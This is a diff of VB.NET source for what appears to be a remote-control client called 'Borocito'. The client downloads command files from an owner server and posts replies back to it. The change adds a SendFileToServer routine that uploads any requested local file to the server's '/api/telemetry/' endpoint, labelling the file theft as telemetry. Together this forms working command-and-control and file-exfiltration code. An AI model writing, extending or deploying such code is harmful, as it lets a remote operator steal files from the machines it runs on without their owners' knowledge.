@@ -1,4 +1,5 @@
-﻿Imports System.Net.Http
+﻿Imports System.IO
+Imports System.Net.Http
 Imports System.Runtime.InteropServices
 Imports System.Text
 Imports Microsoft.Win32
@@ -100,7 +101,7 @@ Module StartUp
 End Module
 Module ResponseAdministrator
 
-    Sub SendToServer(ByVal message As String)
+    Sub SendContentToServer(ByVal message As String)
         Try
             Try
                 Boro_Comm.SendMesssage(message)
@@ -108,12 +109,14 @@ Module ResponseAdministrator
             End Try
             Threading.Thread.Sleep(5000) '5 sec para evitar solapados
             If sendStatus Then
-                AddToLog("SendToServer@ResponseAdministrator", "Processing: " & message, False)
+                AddToLog("SendContentToServer@ResponseAdministrator", "Processing: " & message, False)
+
                 'Obtener comando actual (evita interferir)
                 Dim localCommandFile As String = DIRHome & "\actualCommand.str"
                 If My.Computer.FileSystem.FileExists(localCommandFile) Then
                     My.Computer.FileSystem.DeleteFile(localCommandFile)
                 End If
+
                 'Descargar archivo de comando IDFTP
                 Using client As New HttpClient()
                     client.DefaultRequestHeaders.Add("User-Agent", "Borocito boro-hear")
@@ -127,6 +130,7 @@ Module ResponseAdministrator
                     My.Computer.FileSystem.WriteAllText(localCommandFile, respuestaTexto, False)
                 End Using
                 Dim lineas = IO.File.ReadAllLines(localCommandFile)
+
                 'Prepara el mensaje
                 'Header format
                 '   #|cli_nickname|UID|response_date
@@ -136,37 +140,57 @@ Module ResponseAdministrator
                     vbCrLf & "Command3>" & lineas(3).Split(">"c)(1).Trim() &
                     vbCrLf & "[Response]" &
                     vbCrLf & message
-                SendAPIRequest(postData)
+
+                Dim formData As New Dictionary(Of String, String) From {
+                    {"content", postData}
+                }
+                Using body As New FormUrlEncodedContent(formData)
+                    Using client As New HttpClient()
+                        client.DefaultRequestHeaders.Add("User-Agent", "Borocito boro-hear")
+                        client.DefaultRequestHeaders.Add("UUID", UID)
+                        Dim response As HttpResponseMessage = client.PostAsync(
+                            HttpOwnerServer & "/api/instance/",
+                            body
+                        ).Result
+                    End Using
+                End Using
             Else
-                AddToLog("SendToServer@ResponseAdministrator", "boro-hear paused. Can't process: " & message, False)
+                AddToLog("SendContentToServer@ResponseAdministrator", "boro-hear paused. Can't process: " & message, False)
             End If
         Catch ex As Exception
-            AddToLog("SendToServer@ResponseAdministrator", "Error: " & ex.Message, True)
+            AddToLog("SendContentToServer@ResponseAdministrator", "Error: " & ex.Message, True)
         End Try
     End Sub
 
-    Function SendAPIRequest(ByVal content As String) As Boolean
+    Sub SendFileToServer(ByVal filePath As String)
         Try
-            'AddToLog("Network", "Sending API Request...", False)
+            Dim telemetryUUID As String = Nothing
 
-            Dim formData As New Dictionary(Of String, String) From {
-                {"content", content}
-            }
-            Using body As New FormUrlEncodedContent(formData)
-                Using client As New HttpClient()
-                    client.DefaultRequestHeaders.Add("User-Agent", "Borocito boro-hear")
-                    client.DefaultRequestHeaders.Add("UUID", UID)
-                    Dim response As HttpResponseMessage = client.PostAsync(
-                        HttpOwnerServer & "/api/instance/",
-                        body
-                    ).Result
+            Using client As New HttpClient()
+                client.DefaultRequestHeaders.Add("User-Agent", "Borocito boro-hear")
+                client.DefaultRequestHeaders.Add("UUID", UID)
+
+                Using form As New MultipartFormDataContent()
+                    Using fileStream As New FileStream(filePath, FileMode.Open, FileAccess.Read)
+                        Using fileContent As New StreamContent(fileStream)
+                            form.Add(fileContent, "file", Path.GetFileName(filePath))
+                            Dim response As HttpResponseMessage = client.PostAsync(
+                                HttpOwnerServer & "/api/telemetry/",
+                                form
+                            ).Result
+                            Dim respuestaJson As String = response.Content.ReadAsStringAsync().Result
+                            If Not response.IsSuccessStatusCode Then
+                                Return
+                            End If
+                        End Using
+                    End Using
                 End Using
             End Using
 
-            Return True
+            AddToLog("SendContentToServer@ResponseAdministrator", "Sended telemetry file as requested " & filePath, False)
         Catch ex As Exception
-            AddToLog("SendAPIRequest@ResponseAdministrator", "Error: " & ex.Message, True)
-            Return False
+            AddToLog("SendContentToServer@ResponseAdministrator", "Error: " & ex.Message, True)
         End Try
-    End Function
+    End Sub
+
 End Module
